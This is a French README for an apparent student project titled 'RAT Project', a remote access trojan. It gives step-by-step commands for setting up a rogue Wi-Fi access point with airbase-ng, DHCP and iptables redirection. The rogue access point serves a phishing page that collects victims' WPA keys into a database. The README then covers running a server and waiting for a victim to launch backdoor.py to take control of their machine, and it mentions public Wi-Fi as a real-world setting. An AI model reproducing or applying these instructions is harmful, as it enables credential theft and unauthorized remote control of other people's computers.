# RAT Project - MGS
#### Maxime Chasson - Sacha Perrin - Grégoire Matthieu
## READ ME

### Installation : 

Prérequis : 

- 2 VM Linux
- Point access portable
- Python 3
- Mettre à jour python si besoin (pip install --upgrade pip)
- Mettre à jour la machine Linux (apt-get update)
- Installer le Packages (mss)
- Installer le Packages (requests)
- Installer le Packages (pynput)

### Machine Virtuelle attanquant : 

Si vous utilisez notre solution localement sur deux machines virtuelles, rendez-vous directement à l'Étape 1.

Pour configurer la VM attanquant, vous aurez besoin de Kali Linux à jour, avec votre point d'accès mobile branché.

Installez les packages requis :

```apt update```

```apt install isc-dhcp-server```

```apt install mongodb```

```apt install airmon-ng```

Configurez le DHCP : 

Ouvrez votre terminal et tapez ```nano /etc/dhcpd.conf``` 
Insérez les valeurs suivantes : 

```
authoritative;
default-lease-time 600;
max-lease-time 7200;
subnet 192.168.1.128 netmask 255.255.255.128 {
option subnet-mask 255.255.255.128;
option broadcast-address 192.168.1.255;
option routers 192.168.1.129;
option domain-name-servers 8.8.8.8;
range 192.168.1.140;
}
```

Ensuite, téléchargez la page de phishing de votre choix, naviguez dans ```/var/www/``` et extrayez y votre page.

Démarrez votre server apache et votre mongodb : 

```/etc/init.d/apache2 start```
```/etc/init.d/mongodb start```

Entrez les commandes suivantes : 

```
> mongodb -u root
> create database phishing
> use phishing
> create table wpa_keys(password varchar(64), confirm varchar(64));
```

Laissez le terminal mongodb ouvert et ouvrez un autre terminal.

Sur cet autre terminal : 

Prenez notre de votre ip locale et point d'accès mobile avec : ```ip route```

Entrez ensuite : 

```
> airmon-ng
> airmon-ng start wlan0
```

Maintenant configurez et lancez airbase : 

```
> airodump-ng-oui-update
> airodump-ng -M mon0 #Prenez ici note de l'ESSID, BSSID, et numéro de Chanell cible
> airbase-ng -e [ESSID] -c [N°Channel] -P mon0
```

Ne fermez pas le terminale airbase ni le mongodb, et ouvrez un nouveau terminal, et entrez y les commandes suivantes : 

```
> ifconfig at0 192.168.1.129 netmask 255.255.255.128
> route add -net 192.168.1.128 netmask 255.255.255.128 gw 192.168.1.129
> echo 1 > /proc/sys/net/ipv4/ip_forward
> iptables –table nat –append POSTROUTING –out-interface eth0 -j MASQUERADE
> iptables –append FORWARD –in-interface at0 -j ACCEPT
> iptables -t nat -A PREROUTING -p tcp –dport 80 -j DNAT –to-destination [IP LOCALE:80]
> iptables -t nat -A POSTROUTING -j MASQUERADE
> dhcpd -cf /etc/dhcpd.conf -pf /var/run/dhcpd.pid at0
> etc/init.d/isc-dhcp-server start
```

Votre machine est désormais prête, et votre réseau déployé.

### Phishing

Une fois votre solution déployée, vos utilisateurs peuvent être amenés à se connecter sur votre page de phishing.

Pour accéder aux données entrées par votre victime, ouvrez le terminal MongoDB et entrez les commandes suivantes : 
```
use phishing
select * from wpa_keys;
```

### Étape 1 (sur VMs locales): 
- Une fois que l'installation des prérequis est faite, il va falloir modifier   l'ip et le port dans les fichiers ``serveur.py`` et ``backdoor.py`` (mettre l'ip de ma machine attaquante | le port est aux choix)

### Étape 2 : 

- Ensuite, il suffit de lancer notre ````serveur.py```` et attendre que la victime lance le ```backdoor.py```

- Si tout se passe bien et que tout est bien configuré, la machine devrait se connecter à notre machine attaquante 

- Vous pouvez ici utiliser la commande ```help``` pour afficher les différentes options qui se présentent à vous 

![](https://hackmd.io/_uploads/H1WfacLH2.png)

#### Note : 

- Dans notre cas, nous réalisons les tests sur un réseau local. Dans le cas d'une réel utilisation, les deux machines (attaquantes et victimes) doivent être dans le même réseau. Par exemple un wifi public.

### Étape 3 : 

- Une fois toutes les étapes précédentes réalisées, le contrôle de la machine est récupéré et on peut utiliser les commandes que l'on souhaite sur la machine victime.

### Commandes : 

- Pour afficher les commandes disponibles, utilisez ```help``` une fois connecté à la machine de la victime

![](https://hackmd.io/_uploads/BJcvp9USn.png)
